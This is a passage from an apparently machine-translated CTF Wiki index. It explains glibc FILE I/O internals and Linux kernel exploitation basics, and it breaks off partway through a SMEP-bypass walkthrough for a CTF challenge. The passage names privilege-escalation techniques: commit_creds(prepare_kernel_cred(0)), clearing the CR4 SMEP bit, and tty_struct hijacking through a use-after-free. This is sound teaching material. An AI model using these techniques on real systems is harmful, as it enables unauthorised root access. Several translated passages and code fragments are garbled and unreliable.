<p>size: specifies the length of each record.</p> </li> <li> <p>count: Specifies the number of records.</p> </li> <li> <p>stream: the target file stream.</p> </li> <li> <p>Return value: Returns the number of records read into the data buffer</p> </li> </ul> <p>The code for fread is located in /libio/iofread.c and the function name is _IO_fread, but the real function is implemented in the subfunction _IO_sgetn.</p> <pre><code>_IO_size_t\n\n_IO_fread (buf, size, count, fp)\n\n     void *buf;\n\n     _IO_size_t size;\n\n     _IO_size_t count;\n\n_IO_FILE * fp;\n{\n\n  ...\n\n  bytes_read = _IO_sgetn (fp, (char *) buf, bytes_requested);\n\n  ...\n\n}\n</code></pre> <p>_IO_XSGETN is called in the _IO_sgetn function, and _IO_XSGETN is a function pointer in _IO_FILE_plus.vtable. When this function is called, the pointer in the vtable is first fetched and then called.</p> <pre><code>_IO_size_t\n\n_IO_sgetn (fp, date, n)\n_IO_FILE * fp;\n     void *data;\n\n     _IO_size_t n;\n\n{\n\n  return _IO_XSGETN (fp, data, n);\n\n}\n</code></pre> <p>By default the function pointer points to the _IO_file_xsgetn function.</p> <pre><code>  if (fp-&gt;_IO_buf_base\n\n          &amp;&amp; want &lt; (size_t) (fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base))\n\n        {\n\n          if (__underflow (fp) == EOF)\n\n        break;\n\n\n\n          continue;\n\n        }\n</code></pre>"},{"location":"pwn/linux/io_file/introduction/#fwrite","title":"fwrite","text":"<p>Fwrite is also a standard IO library function, the function is to write data to the file stream, the function prototype is as follows</p> <pre><code>size_t fwrite(const void* buffer, size_t size, size_t count, FILE* stream);\n</code></pre> <ul> <li> <p>buffer: is a pointer, for fwrite, is the address to write data;</p> </li> <li> <p>size: the number of single bytes to write to the content;</p> </li> <li> <p>count: the number of data items to be written to size bytes;</p> </li> <li> <p>stream: target file pointer;</p> </li> <li> <p>Return value: count of the number of data items actually written.</p> </li> </ul> <p>The code for fwrite is located in /libio/iofwrite.c and the function name is _IO_fwrite. In _IO_fwrite, _IO_XSPUTN is mainly called to implement the write function.</p> <p>According to the introduction of _IO_FILE_plus, it can be seen that _IO_XSPUTN is located in the vtable of _IO_FILE_plus. To call this function, you need to first take out the pointer in the vtable and then jump over to make the call.</p> <pre><code>written = _IO_sputn (fp, (const char *) buf, request);\n</code></pre> <p>The _IO_OVERFLOW, also located in the vtable, is called in the default function _IO_new_file_xsputn corresponding to _IO_XSPUTN.</p> <pre><code> /* Next flush the (full) buffer. */\n\n      if (_IO_OVERFLOW (f, EOF) == EOF)\n</code></pre> <p>The default function of _IO_OVERFLOW is _IO_new_file_overflow</p> <pre><code>if (ch == EOF)\n\n    return _IO_do_write (f, f-&gt;_IO_write_base,\n\n             f-&gt;_IO_write_ptr - f-&gt;_IO_write_base);\n\n  if (f-&gt;_IO_write_ptr == f-&gt;_IO_buf_end ) /* Buffer is really full */\n\n    if (_IO_do_flush (f) == EOF)\n\n      return EOF;\n</code></pre> <p>The system interface write function will eventually be called inside _IO_new_file_overflow.</p>"},{"location":"pwn/linux/io_file/introduction/#fopen","title":"fopen","text":"<p>Fopen is used to open files in the standard IO library. The function prototype is as follows</p> <pre><code>FILE *fopen(char *filename, *type);\n</code></pre> <ul> <li> <p>filename: the path to the target file</p> </li> <li> <p>type: type of open method</p> </li> <li> <p>Return value: return a file pointer</p> </li> </ul> <p>Inside the fopen will create a FILE structure and perform some initialization operations, let's take a look at this process</p> <p>First, the malloc function is called inside the fopen corresponding function __fopen_internal, and the space of the FILE structure is allocated. So we can know that the FILE structure is stored on the heap.</p> <pre><code>*new_f = (struct locked_FILE *) malloc (sizeof (struct locked_FILE));\n</code></pre> <p>After that, the vtable will be initialized for the created FILE, and _IO_file_init will be called to further initialize the operation. <pre><code>_IO_JUMPS (&amp;new_f-&gt;fp) = &amp;_IO_file_jumps;\n\n_IO_file_init (&amp;new_f-&gt;fp);\n</code></pre></p> <p>In the initialization operation of the _IO_file_init function, _IO_link_in is called to link the newly allocated FILE into _IO_list_all as the starting FILE list. <pre><code>void\n\n_IO_link_in (fp)     struct _IO_FILE_plus *fp;\n\n{\n\n    if ((fp-&gt;file._flags &amp; _IO_LINKED) == 0)\n\n    {\n\n      fp-&gt;file._flags |= _IO_LINKED;\n\nfp-&amp;gt; file._chain = (_IO_FILE *) _IO_list_all;\n      _IO_list_all = fp;\n\n      ++_IO_list_all_stamp;\n\n    }\n\n}\n</code></pre></p> <p>After that, the __fopen_internal function will call the _IO_file_fopen function to open the target file. _IO_file_fopen will open according to the open mode passed by the user. In the end, it will call the system interface open function, which is not deepened here. <pre><code>if (_IO_file_fopen ((_IO_FILE *) new_f, filename, mode, is32) != NULL)\n\n    return __fopen_maybe_mmap (&amp;new_f-&gt;fp.file);\n</code></pre></p> <p>Summarize the operation of fopen is</p> <ul> <li>Use malloc to allocate FILE structure</li> <li>Set the vtable of the FILE structure</li> <li>Initialize the allocated FILE structure</li> <li>Link the initialized FILE structure into the FILE structure list</li> <li>Call system call to open file</li> </ul>"},{"location":"pwn/linux/io_file/introduction/#fclose","title":"fclose","text":"<p>Fclose is a function in the standard IO library for closing open files, which is the opposite of fopen.</p> <pre><code>int fclose(FILE *stream)\n</code></pre> <p>Function: Close a file stream, use fclose to output the last remaining data in the buffer to the disk file, and release the file pointer and related buffer</p> <p>Fclose will first call _IO_unlink_it to delink the specified FILE from the _chain list.</p> <pre><code>if (fp-&gt;_IO_file_flags &amp; _IO_IS_FILEBUF)\n\n_IO_un_link ((struct _IO_FILE_plus *) fp);\n</code></pre> <p>After that, the _IO_file_close_it function will be called, and _IO_file_close_it will call the system interface close to close the file.</p> <pre><code>if (fp-&gt;_IO_file_flags &amp; _IO_IS_FILEBUF)\n\n    status = _IO_file_close_it (fp);\n</code></pre> <p>Finally, the _IO_FINISH in the vtable is called, which corresponds to the _IO_file_finish function, which will call the free function to release the previously allocated FILE structure.</p> <pre><code>_IO_FINISH (fp);\n</code></pre>"},{"location":"pwn/linux/io_file/introduction/#printfputs","title":"printf/puts","text":"<p>Printf and puts are commonly used output functions. When the printf argument is a pure string ending with '\\n', printf will be optimized to puts the function and remove the newline.</p> <p>The function that puts implements in the source code is _IO_puts. The operation of this function is roughly the same as that of fwrite. The function also calls _IO_sputn in the vtable. The result is _IO_new_file_xsputn, and finally the system interface write function is called.</p> <p>Printf's call stack traceback is as follows, also implemented by _IO_file_xsputn</p> <pre><code>vfprintf+11\n\n_IO_file_xsputn\n_IO_file_overflow\n\nfunlockfile\n\n_IO_file_write\n\nwrite\n</code></pre>"},{"location":"pwn/linux/kernel/basic_knowledge/","title":"Basics","text":"<p>Introduce some basic knowledge that Linux kernel pwn will use, and will gradually add it later.</p> <p>Mainly refer to [Linux Kernel Exploitation] (https://github.com/ctf-wiki/ctf-wiki/blob/master/docs/pwn/linux/kernel/ref/13_lecture.pdf).</p>"},{"location":"pwn/linux/kernel/basic_knowledge/#kernel","title":"Kernel","text":"<p>The kernel is also a program that manages the data I/O requirements issued by the software, escaping these requirements into instructions, and handing them over to the CPU and other components in the computer. The kernel is the most basic part of modern operating systems.</p> <p></p> <p>The main function of the kernel is twofold:</p> <ol> <li>Control and interact with the hardware</li> <li>Provide an environment in which the application can run</li> </ol> <p>Various functions including I/O, permission control, system call, process management, memory management, etc. can be attributed to the above two points.</p> <p>It should be noted that the kernel crash usually causes a reboot.</p>"},{"location":"pwn/linux/kernel/basic_knowledge/#ring-model","title":"Ring Model","text":"<p>The intel CPU divides the privilege level of the CPU into four levels: Ring 0, Ring 1, Ring 2, Ring 3.</p> <p>Ring0 is only used by the OS. All Ring 3 programs can be used. The inner ring can use the resources of the outer ring.</p> <p>The Ring Model is used to improve system security. For example, a spyware as a user program running on Ring 3 will be blocked when the user is not notified, because the access hardware needs to use the Ring 1 reserved by the being driver. method.</p> <p>Most modern operating systems use only Ring 0 and Ring 3.</p>"},{"location":"pwn/linux/kernel/basic_knowledge/#loadable-kernel-moduleslkms","title":"Loadable Kernel Modules(LKMs)","text":"<p>Loadable core modules (or directly called kernel modules) are like executable programs running in kernel space, including:</p> <ul> <li>Drivers</li> <li>device driver</li> <li> <p>File system driver</p> <ul> <li>...</li> </ul> </li> <li> <p>kernel extension modules (modules)</p> </li> </ul> <p>The file format of LKMs is the same as that of user mode. ELF under Linux, exe/dll under Windows, and MACH-O under mac, so we can use IDA and other tools to analyze kernel modules.</p> <p>Modules can be compiled separately, but not separately. It is linked to the kernel as part of the kernel at run time, running in kernel space, unlike processes running on user controls.</p> <p>Modules are often used to implement a file system, a driver, or other kernel-level functionality.</p> <p>&gt; The Linux kernel provides a modular mechanism because it is itself a monolithic kernel. The advantage of a single core is that it is efficient because all the content is brought together, but the disadvantage is that the scalability and maintainability are relatively poor, and the module mechanism is to make up for this defect.</p>"},{"location":"pwn/linux/kernel/basic_knowledge/#related-instructions","title":"Related Instructions","text":"<ul> <li>insmod: Load the specified module into the kernel</li> <li>rmmod: Unload the specified module from the kernel</li> <li>lsmod: List the modules that have been loaded</li> </ul> <p>&gt; Most kernel vulnerability is also in LKM.</p>"},{"location":"pwn/linux/kernel/basic_knowledge/#syscall","title":"syscall","text":"<p>A system call is a program in which user space requests a service that requires higher privileges from the operating system kernel, such as IO operations or interprocess communication. The system call provides an interface between the user program and the operating system. Some library functions (such as scanf, puts, etc. IO related functions are actually the encapsulation (read and write) of the system call).</p> <p>&gt; View 64-bit and 32-bit system calls in /usr/include/x86_64-linux-gnu/asm/unistd_64.h and /usr/include/x86_64-linux-gnu/asm/unistd_32.h respectively number.</p> <p>&gt; Also recommend a very useful website [Linux Syscall Reference] (https://syscalls.kernelgrok.com), you can refer to the register meaning and source code of the 32-bit system call. Teachers are welcome to recommend 64-bit similar features.</p>"},{"location":"pwn/linux/kernel/basic_knowledge/#ioctl","title":"ioctl","text":"<p>Directly view the man page <pre><code>NAME\n\n       ioctl - control device\n\n\n\nSYNOPSIS\n\n       #include &lt;sys/ioctl.h&gt;\n\n\n\n       int ioctl(int fd, unsigned long request, ...);\n\n\n\nDESCRIPTION\n\n       The ioctl() system call manipulates the underlying device parameters of special\n\n       files.  In particular, many  operating  characteristics  of  character  special\n\n       files  (e.g., terminals) may be controlled with ioctl() requests.  The argument\n\n       fd must be an open file descriptor.\n\n\n\n       The second argument is a device-dependent request code.  The third argument  is\n\n       an  untyped  pointer  to  memory.  It's traditionally char *argp (from the days\n\n       before void * was valid C), and will be so named for this discussion.\n\n\n\n       An ioctl() request has encoded in it whether the argument is an in parameter or\n\n       out  parameter, and the size of the argument argp in bytes.  Macros and defines\n\n       used in specifying an ioctl() request are located in the file &lt;sys/ioctl.h&gt;.\n</code></pre></p> <p>It can be seen that ioctl is also a system call for communicating with devices.</p> <p>The first argument to <code>int ioctl(int fd, unsigned long request, ...)</code> is the [file descriptor] returned by the open device (open) (http://m4x.fun/post/play-with-file -descriptor-1/), the second parameter is the user program's control command for the device, and the latter parameter is some supplementary parameter, which is related to the device.</p> <p>&gt; Reasons for communicating with ioctl:</p> <p>&gt; The operating system provides kernel access to system calls to standard external devices, as most hardware devices can only be addressed directly within kernel space, but when accessing non-standard hardware devices these system calls are not appropriate, and sometimes user mode may need to be directly Access the device.</p> <p>&gt; For example, a system administrator might want to modify the configuration of the NIC. Modern operating systems provide support for a wide variety of devices, and some devices may not be considered by the kernel designer, thus making it impossible to provide such a system call to use the device.</p> <p>&gt; To solve this problem, the kernel is designed to be extensible, and a module called device driver can be added. The driver code allows it to run in kernel space and directly address the device. An Ioctl interface is a separate system call through which user space can communicate with device drivers. The device-driven request is an Ioctl call with the device and request number as parameters, so the kernel allows user space to access the device driver and access the device without knowing the specific device details, and does not require a lot of different devices. System call.</p>"},{"location":"pwn/linux/kernel/basic_knowledge/#status-switch","title":"Status Switch","text":""},{"location":"pwn/linux/kernel/basic_knowledge/#user-space-to-kernel-space","title":"user space to kernel space","text":"<p>When a 'system call', <code>generate exception</code>, <code>peripheral generate interrupt</code>, etc. event occurs, the user mode to kernel mode switch occurs. The specific process is:</p> <ol> <li>Switch the GS segment register with <code>swapgs</code> to exchange the GS register value with the value of a specific location. The purpose is to save the GS value and use the value of this location as the GS value when the kernel is executed.</li> <li>Record the current top of the stack (the top of the user space stack) in the CPU exclusive variable area, and put the top of the kernel stack recorded in the CPU exclusive area into rsp/esp.</li> <li>Save each register value by push. The specific [code] (http://elixir.free-electrons.com/linux/v4.12/source/arch/x86/entry/entry_64.S) is as follows:</li> </ol> <p><code>`</code>asm \u200b    ENTRY(entry_SYSCALL_64)</p> <p>/ SWAPGS_UNSAFE_STACK is a macro, x86 is directly defined as the swapgs command / \u200b    SWAPGS_UNSAFE_STACK</p> <p>\u200b   </p> <p>/ Save the stack value and set the kernel stack / \u200b    movq %rsp, PER_CPU_VAR(rsp_scratch)</p> <pre><code> movq PER_CPU_VAR(cpu_current_top_of_stack), %rsp\n</code></pre> <p>\u200b   </p> <p>\u200b   </p> <p>/ Save the register value by push to form a pt_regs structure/ \u200b   / Construct struct pt_regs on stack /</p> <pre><code>pushq  $__USER_DS      /* pt_regs-&gt;ss */\n\npushq  PER_CPU_VAR(rsp_scratch)  /* pt_regs-&gt;sp */\n\npushq  %r11             /* pt_regs-&gt;flags */\n\npushq  $__USER_CS      /* pt_regs-&gt;cs */\n\npushq  %rcx             /* pt_regs-&gt;ip */\n\npushq  %rax             /* pt_regs-&gt;orig_ax */\n</code></pre> <p>pushq% rdi / * pt_regs-&gt; at * / pushq% rsi / * pt_regs-&gt; and * / \u200b   pushq  %rdx             / pt_regs-&gt;dx / Pushq %rcx tuichu / pt_regs-&gt;cx / \u200b   pushq  $-ENOSYS        / pt_regs-&gt;ax /</p> <pre><code>pushq  %r8              /* pt_regs-&gt;r8 */\n</code></pre> <p>pushq% r9 / * pt_regs-&gt; r9 * / \u200b   pushq  %r10             / pt_regs-&gt;r10 /</p> <pre><code>pushq  %r11             /* pt_regs-&gt;r11 */\n\nsub $(6*8), %rsp      /* pt_regs-&gt;bp, bx, r12-15 not saved */\n\n```\n</code></pre> <ol> <li>Determine if it is x32_abi by the assembly instruction.</li> <li>Continue to execute the system call by jumping to the corresponding location of the global variable <code>sys_call_table</code> by the system call number.</li> </ol>"},{"location":"pwn/linux/kernel/basic_knowledge/#kernel-space-to-user-space","title":"kernel space to user space","text":"<p>When exiting, the process is as follows:</p> <ol> <li>Restore GS value by <code>swapgs</code></li> <li>Resume to the user control via <code>sysretq</code> or <code>iretq</code> to continue execution. If you use <code>iretq</code> you also need to give some information about the user space (CS, eflags/rflags, esp/rsp, etc.)</li> </ol>"},{"location":"pwn/linux/kernel/basic_knowledge/#structure-i-think","title":"structure I think","text":"<p>As mentioned before, the kernel records the permissions of the process. More specifically, it is recorded by the cred structure. Each process has a cred structure. This structure saves the permissions of the process (uid, gid, etc.). Can modify the cred of a process, then modify the permissions of this process.</p> <p>[source code] (https://code.woboq.org/linux/linux/include/linux/cred.h.html#cred) as follows: <code>`</code>asm struct cred { \u200b   atomic_t    usage;</p>"},{"location":"pwn/linux/kernel/basic_knowledge/#ifdef-config_debug_credentials","title":"ifdef CONFIG_DEBUG_CREDENTIALS","text":"<pre><code>atomic_t    subscribers;    /* number of processes subscribed */\n\nvoid        *put_addr;\n\nunsigned    magic;\n</code></pre>"},{"location":"pwn/linux/kernel/basic_knowledge/#define-cred_magic-0x43736564","title":"define CRED_MAGIC  0x43736564","text":""},{"location":"pwn/linux/kernel/basic_knowledge/#define-cred_magic_dead-0x44656144","title":"define CRED_MAGIC_DEAD 0x44656144","text":""},{"location":"pwn/linux/kernel/basic_knowledge/#endif","title":"endif","text":"<p>\u200b   kuid_t      uid;        / real UID of the task /</p> <pre><code>kgid_t      gid;        /* real GID of the task */\n\nkuid_t      suid;       /* saved UID of the task */\n\nkgid_t      sgid;       /* saved GID of the task */\n\nkuid_t      euid;       /* effective UID of the task */\n\nkgid_t      egid;       /* effective GID of the task */\n</code></pre> <p>but_t fsuid; / * UID for VFS ops * / \u200b   kgid_t      fsgid;      / GID for VFS ops /</p> <pre><code>unsigned    securebits; /* SUID-less security management */\n\nkernel_cap_t    cap_inheritable; /* caps our children can inherit */\n\nkernel_cap_t    cap_permitted;  /* caps we're permitted */\n\nkernel_cap_t    cap_effective;  /* caps we can actually use */\n\nkernel_cap_t    cap_bset;   /* capability bounding set */\n\nkernel_cap_t    cap_ambient;    /* Ambient capability set */\n</code></pre>"},{"location":"pwn/linux/kernel/basic_knowledge/#ifdef-config_keys","title":"ifdef CONFIG_KEYS","text":"<pre><code>unsigned char   jit_keyring;    /* default keyring to attach requested\n\n                 * keys to */\n\nstruct key __rcu *session_keyring; /* keyring inherited over fork */\n\nstruct key  *process_keyring; /* keyring private to this process */\n\nstruct key  *thread_keyring; /* keyring private to this thread */\n\nstruct key  *request_key_auth; /* assumed request_key authority */\n</code></pre>"},{"location":"pwn/linux/kernel/basic_knowledge/#endif_1","title":"endif","text":""},{"location":"pwn/linux/kernel/basic_knowledge/#ifdef-config_security","title":"ifdef CONFIG_SECURITY","text":"<pre><code>void        *security;  /* subjective LSM security */\n</code></pre>"},{"location":"pwn/linux/kernel/basic_knowledge/#endif_2","title":"endif","text":"<p>\u200b   struct user_struct user;   / real user ID subscription */</p> <pre><code>struct user_namespace *user_ns; /* user_ns the caps and keyrings are relative to. */\n\nstruct group_info *group_info;  /* supplementary groups for euid/fsgid */\n\nstruct rcu_head rcu;        /* RCU deletion hook */\n</code></pre> <p>} __randomize_layout;</p> <pre><code>## Kernel state function\nKernel state functions have some changes compared to user state library functions\n\n\n- printf() -&amp;gt; **printk()**, but note that printk() does not necessarily display the content on the terminal, but it must be in the kernel buffer. You can view the effect via `dmesg`\n- memcpy()      -&gt;      **copy\\_from\\_user()/copy\\_to\\_user()**\n\n- copy\\_from\\_user() implements transferring user space data to kernel space\n- copy\\_to\\_user() implements transferring kernel space data to user space\n- malloc() -&amp;gt; **kmalloc()**, kernel-mode memory allocation function, similar to malloc(), but using the `slab/slub allocator`\n- free()        -&gt;      **kfree()**\uff0c\u540c kmalloc()\n\n\n\nAlso note that the `kernel manages the process, so the kernel also records the permissions of the process`. There are two functions in the kernel that can easily change permissions:\n\n\n- **int commit_creds(struct cred \\*new)**\n\n- **struct cred\\* prepare_kernel_cred(struct task_struct\\* daemon)**\n\n\n\nAs you can see from the function name, execute `commit_creds(prepare_kernel_cred(0))` to get root privileges (root&amp;#39;s uid, gid is 0)\n\n\nExecuting `commit_creds(prepare_kernel_cred(0))` is also the most commonly used method of lifting. The addresses of both functions can be viewed in `/proc/kallsyms` (the older kernel version is `/proc/ksyms`.\n\u200b```bash\n\npost sudo grep commit_creds /proc/kallsyms \n\n[sudo] m4x password:\nffffffffbb6af9e0 T commit_creds\n\nffffffffbc7cb3d0 r __ksymtab_commit_creds\n\nffffffffbc7f06fe r __kstrtab_commit_creds\n\npost sudo grep prepare_kernel_cred /proc/kallsyms\n\nffffffffbb6afd90 T prepare_kernel_cred\n\nffffffffbc7d4f20 r __ksymtab_prepare_kernel_cred\n\nffffffffbc7f06b7 r __kstrtab_prepare_kernel_cred\n</code></pre> <p>&gt; In general, the contents of /proc/kallsyms require root privileges to view</p>"},{"location":"pwn/linux/kernel/basic_knowledge/#mitigation","title":"Mitigation","text":"<p>&gt; canary, dep, PIE, RELRO and other protections are the same as user principles</p> <ul> <li> <p>smep: Supervisor Mode Execution Protection, when the processor is in <code>ring0</code> mode, executing the <code>userspace</code> code will trigger a page fault. (This protection is called <code>PXN</code> in arm)</p> </li> <li> <p>smap: Superivisor Mode Access Protection, similar to smep, usually when accessing data.</p> </li> <li> <p>mmap_min_addr:</p> </li> </ul>"},{"location":"pwn/linux/kernel/basic_knowledge/#ctf-kernel-pwn-related","title":"CTF kernel pwn Related","text":"<p>Generally given the following three documents</p> <ol> <li>boot.sh: a script for starting the shell of the kernel, mostly using qemu, the protection measures are related to the different startup parameters of qemu</li> <li> <p>bzImage: kernel binary</p> </li> <li> <p>rootfs.cpio: file system image</p> </li> </ol> <p>such as: \u200b   </p> <pre><code>```bash\n</code></pre> <p>CISCN2017_babydriver [master]] ls babydriver.tar CISCN2017_babydriver [master \u25cf] x baby driver.tar \u200b   boot.sh</p> <pre><code>bzImage\n\nrootfs.cpio\n</code></pre> <p>CISCN2017_babydriver [master]] ls \u200b   babydriver.tar  boot.sh  bzImage  rootfs.cpio</p> <pre><code>CISCN2017_babydriver [master\u25cf] file bzImage\n\nbzImage: Linux kernel x86 boot executable bzImage, version 4.4.72 (atum@ubuntu) #1 SMP Thu Jun 15 19:52:50 PDT 2017, RO-rootFS, swap_dev 0x6, Normal VGA\n\nCISCN2017_babydriver [master\u25cf] file rootfs.cpio\n\nrootfs.cpio: gzip compressed data, last modified: Tue Jul  4 08:39:15 2017, max compression, from Unix, original size 2844672\nCISCN2017_babydriver [master\u25cf] file boot.sh\n\nboot.sh: Bourne-Again shell script, ASCII text executable\n</code></pre> <p>CISCN2017_babydriver [master \u25cf] bat boot.sh \u200b   \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500</p> <pre><code>       \u2502 File: boot.sh\n\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\n   1   \u2502 #!/bin/bash\n\n   2   \u2502\n\n   3   \u2502 qemu-system-x86_64 -initrd rootfs.cpio -kernel bzImage -append 'console=ttyS0 ro\n\n       \u2502 ot=/dev/ram oops=panic panic=1' -enable-kvm -monitor /dev/null -m 64M --nographi\n\n       \u2502 c  -smp cores=1,threads=1 -cpu kvm64,+smep\n\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\n```\n</code></pre> <p>Explain the parameters that qemu starts: \u200b   </p> <ul> <li>-initrd rootfs.cpio, using rootfs.cpio as the kernel-initiated file system</li> <li>-kernel bzImage, using bzImage as the kernel image</li> <li>-cpu kvm64, +smep, set the security options for the CPU, here smep is enabled</li> <li> <p>-m 64M, set the virtual RAM to 64M, the default is 128M Other options can be viewed with --help.</p> </li> <li> <p>After writing the exploit locally, you can save the compiled binary file to the remote directory by base64 encoding, etc., and then get the flag.</p> </li> </ul>"},{"location":"pwn/linux/kernel/basic_knowledge/#reference","title":"Reference:","text":"<p>Https://en.wikipedia.org/wiki/kernel</p> <p>https://en.wikipedia.org/wiki/Classified protection domain</p> <p>https://zh.wikipedia.org/wiki/Ioctl</p> <p>http://www.freebuf.com/articles/system/54263.html</p> <p>https://blog.csdn.net/zqixiao_09/article/details/50839042</p> <p>https://yq.aliyun.com/articles/53679</p>"},{"location":"pwn/linux/kernel/bypass_smep/","title":"bypass-smep","text":""},{"location":"pwn/linux/kernel/bypass_smep/#smep","title":"SMEP","text":"<p>In order to prevent the <code>ret2usr</code> attack, the kernel developer proposed <code>smep</code> protection, smep full name <code>Supervisor Mode Execution Protection</code>, which is a protection measure of the kernel. When the CPU is in <code>ring0</code> mode, it performs <code>user space&amp;#39;. Code</code> will trigger a page fault; this protection is called <code>PXN</code> in arm.</p> <p>The option when starting the kernel with qemu can determine whether smep protection is enabled. <pre><code>CISCN2017_babydriver [master \u25cf\u25cf] grab smep ./boot.sh\nqemu-system-x86_64 -initrd rootfs.cpio -kernel bzImage -append 'console=ttyS0 root=/dev/ram oops=panic panic=1' -enable-kvm -monitor /dev/null -m 64M --nographic  -smp cores=1,threads=1 -cpu kvm64,+smep\n</code></pre></p> <p>Can also pass <pre><code>CISCN2017_babydriver [master \u25cf\u25cf] grep smep / proc / cpuinfo\nflags       : fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush dts acpi mmx fxsr sse sse2 ss ht tm pbe syscall nx pdpe1gb rdtscp lm constant_tsc arch_perfmon pebs bts rep_good nopl xtopology nonstop_tsc cpuid aperfmperf pni pclmulqdq dtes64 monitor ds_cpl vmx est tm2 ssse3 sdbg fma cx16 xtpr pdcm pcid sse4_1 sse4_2 x2apic movbe popcnt aes xsave avx f16c rdrand lahf_lm abm 3dnowprefetch cpuid_fault epb invpcid_single pti tpr_shadow vnmi flexpriority ept vpid fsgsbase tsc_adjust bmi1 avx2 smep bmi2 erms invpcid rdseed adx smap intel_pt xsaveopt dtherm ida arat pln pts\n\n......\n</code></pre></p> <p>Check if the protection is turned on.</p>"},{"location":"pwn/linux/kernel/bypass_smep/#smep-and-cr4-registers","title":"smep and CR4 registers","text":"<p>The system judges whether to enable smep protection according to the value of the CR4 register. When the 20<sup>th</sup> bit of the CR4 register is 1, the protection is turned on; when it is 0, the protection is turned off.</p> <p></p> <p>For example, when <pre><code>$ CR4 = 0x1407f0 = 000 1 0100 0000 0111 1111 0000\n</code></pre></p> <p>When smep protection is turned on. The CR4 register can be modified by the mov instruction, so only the need is needed. <code>`</code>asm mov cr4, 0x1407e0</p>"},{"location":"pwn/linux/kernel/bypass_smep/#0x1407e0-101-0-0000-0011-1111-00000","title":"0x1407e0 = 101 0 0000 0011 1111 00000","text":"<pre><code>You can turn off smep protection.\n\n\nSearching for the gadget extracted from `vmlinux` is easy to achieve.\n\n\n- How do I check the value of the CR4 register?\n- gdb cannot view the value of the cr4 register and can be viewed by the information when the kernel crashes. In order to turn off smep protection, a fixed value of `0x6f0`, ie `mov cr4, 0x6f0`, is commonly used.\n\n\n### CISCN2017 - baby driver\nI have previously analyzed the use of [uaf to change cred] (https://ctf-wiki.github.io/ctf-wiki/pwn/linux/kernel/kernel_uaf/#ciscn2017-babydriver), this time, another way, Elevate by closing smep protection and ret2usr.\n\n\nThe method chosen here is to first control a `tty_struct` structure through uaf, and assign such a structure when `open(&amp;quot;/dev/ptmx&amp;quot;, O_RDWR)`\n\n\nThe [source] of `tty_struct` (https://code.woboq.org/linux/linux/include/linux/tty.h.html#tty_struct) is as follows:\n\u200b```C\n\nstruct tty_struct {\n\n    int magic;\n\n    struct kref kref;\n\n    struct device *dev;\n\n    struct tty_driver *driver;\n\n    const struct tty_operations *ops;\n\n    int index;\n\n    /* Protects ldisc changes: Lock tty not pty */\n\n    struct ld_semaphore ldisc_sem;\n\n    struct tty_ldisc *ldisc;\n\n    struct mutex atomic_write_lock;\n\n    struct mutex legacy_mutex;\n\n    struct mutex throttle_mutex;\n\n    struct rw_semaphore termios_rwsem;\n\n    struct mutex winsize_mutex;\n\n    spinlock_t ctrl_lock;\n\n    spinlock_t flow_lock;\n\n    /* Termios values are protected by the termios rwsem */\n\n    struct ktermios termios, termios_locked;\n\n    struct termiox *termiox;    /* May be NULL for unsupported */\n\n    char name[64];\n\n    struct pid *pgrp;       /* Protected by ctrl lock */\n\n    struct pid *session;\n\n    unsigned long flags;\n\n    int count;\n\n    struct winsize winsize;     /* winsize_mutex */\n\n    unsigned long stopped:1,    /* flow_lock */\n\n              flow_stopped:1,\n\n              unused:BITS_PER_LONG - 2;\n\n    int hw_stopped;\n\n    unsigned long ctrl_status:8,    /* ctrl_lock */\n\n              packet:1,\n\n              unused_ctrl:BITS_PER_LONG - 9;\n\n    unsigned int receive_room;  /* Bytes free for queue */\n\n    int flow_change;\n\n    struct tty_struct *link;\n\n    struct fasync_struct *fasync;\n\n    wait_queue_head_t write_wait;\n\n    wait_queue_head_t read_wait;\n\n    struct work_struct hangup_work;\n\n    void *disc_data;\n\n    void *driver_data;\n\n    spinlock_t files_lock;      /* protects tty_files list */\n\n    struct list_head tty_files;\n\n#define N_TTY_BUF_SIZE 4096\n\n    int closing;\n\n    unsigned char *write_buf;\n\n    int write_cnt;\n\n    /* If the tty has a pending do_SAK, queue it here - akpm */\n\n    struct work_struct SAK_work;\n\n    struct tty_port *port;\n\n} __randomize_layout;\n</code></pre> <p>Why should we control this structure? Because there is another interesting structure <code>tty_operations</code>, [source] (https://code.woboq.org/linux/linux/include/linux/tty_driver.h.html#tty_operations) is as follows: <pre><code>struct tty_operations {\n\n    struct tty_struct * (*lookup)(struct tty_driver *driver,\n\n            struct file *filp, int idx);\n\n    int  